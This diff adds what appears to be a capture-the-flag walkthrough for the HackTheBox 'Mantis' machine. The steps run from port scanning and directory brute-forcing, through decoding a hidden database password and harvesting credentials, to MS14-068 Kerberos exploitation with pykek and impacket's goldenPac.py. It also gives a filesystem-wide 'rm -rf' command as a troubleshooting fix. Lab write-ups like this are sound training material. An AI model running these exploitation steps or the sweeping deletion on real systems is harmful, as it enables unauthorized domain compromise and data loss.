@@ -1,0 +1,78 @@
+1. Run nmap scan, from nmap scan we are able to determine that the machine is a windows 2008 Server, with   windows sql enabled. We also run a full tcp port scan to find anymore lingering ports that have not 
+   been found: nmap -p- -oA all-ports 10.10.10.52
+
+2. After running a full port scan, we find one of the missing ports not detailed in the initial nmap scan   that port being 1337. We run a gobuster to attempt to find any of available directories on the
+   webserver being hosted by the mantis machine.
+
+ gobuster dir -u http://10.10.10.52:1337/ -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt 
+3. From gobuster we are able to find an interesting directory called, "secure_notes" within this
+   directory, within the directory there is a unique file named:
+	dev_notes_NmQyNDI0NzE2YzVmNTM0MDVmNTA0MDczNzM1NzMwNzI2NDIx.txt.txt
+   It also contain sthe following text:
+	1. Download OrchardCMS
+	2. Download SQL server 2014 Express ,create user "admin",and create orcharddb database
+	3. Launch IIS and add new website and point to Orchard CMS folder location.
+	4. Launch browser and navigate to http://localhost:8080
+	5. Set admin password and configure sQL server connection string.
+	6. Add blog pages with admin user.
+
+  There also appears to be a secret message hidden within the name of the file, to decode the message 
+  use the following:
+	echo NmQyNDI0NzE2YzVmNTM0MDVmNTA0MDczNzM1NzMwNzI2NDIx | base64 -d | xxd -ps -r
+  The output appears to be a string that maybe the admin password for the database:
+	m$$ql_S@_P@ssW0rd!
+
+4. Next step is to access the database and navigate it to find pertinent info. To achieve this we can use
+   a database client to allow for the ease of navigating. The cient is called "dbeaver".
+   
+   If you navigate to orcharddb, dbo , tables, blog_Orchard_Users_UserPartRecord you will be able to
+   find in the data tab usernames and passwords for the admin and james user.
+	admin	AL1337E2D6YHm0iIysVzG8LA76OozgMSlyOJk1Ov5WCGK+lgKY6vrQuswfWHKZn2+A==
+	james	J@m3s_P@ssW0rd!
+
+   The james user will allow you to get a foothold on the box.
+ 
+   To list shares enter the following:
+	smbclient -L 10.10.10.52  -U james
+	Enter WORKGROUP\james's password: 
+
+	Sharename       Type      Comment
+	---------       ----      -------
+	ADMIN$          Disk      Remote Admin
+	C$              Disk      Default share
+	IPC$            IPC       Remote IPC
+	NETLOGON        Disk      Logon server share 
+	SYSVOL          Disk      Logon server share 
+
+5. Next thing we use is the "knock pass kerberos exploitation" google and you will find a way to gain 
+   admin privileges. The page is in the following link: https://wizard32.net/blog/knock-and-pass-kerberos-exploitation.html
+
+   Now just follow the instructions.
+
+   Note: Make sure to use "chattr" to make the /etc/resolv.conf immutable: ex. chattr +i /etc/resolv.conf
+   otherwise network manager will reset settings.
+
+   Note while modifying, the /etc/krb5.conf make sure that all the names are captialized otherwise the 
+   kinit command will not work.	
+
+	kinit james
+	klist
+
+
+	SID: james S-1-5-21-4220043660-4019079961-2895681657-1103 (User: 1)
+	SID: james S-1-5-21-4220043660-4019079961-2895681657-1103 (User: 1)
+
+	smbclient -W HTB.LOCAL //mantis/c$ -k
+	rpcclient -U james HTB.LOCAL	
+
+	~/htb/mantis/exploit/windows-kernel-exploits/MS14-068/pykek# python ms14-068.py -u james@HTB.LOCAL -s S-1-5-21-4220043660-4019079961-2895681657-1103 -d HTB.LOCAL
+
+	/usr/local/bin/goldenPac.py HTB.LOCAL/james@mantis.htb.local
+
+
+	If having issue delete all of impacket files: find / -type d -name '*impacket*' -exec rm -rf {} \;
+
+	AND Install back again:
+	pip3 install impacket
+
+
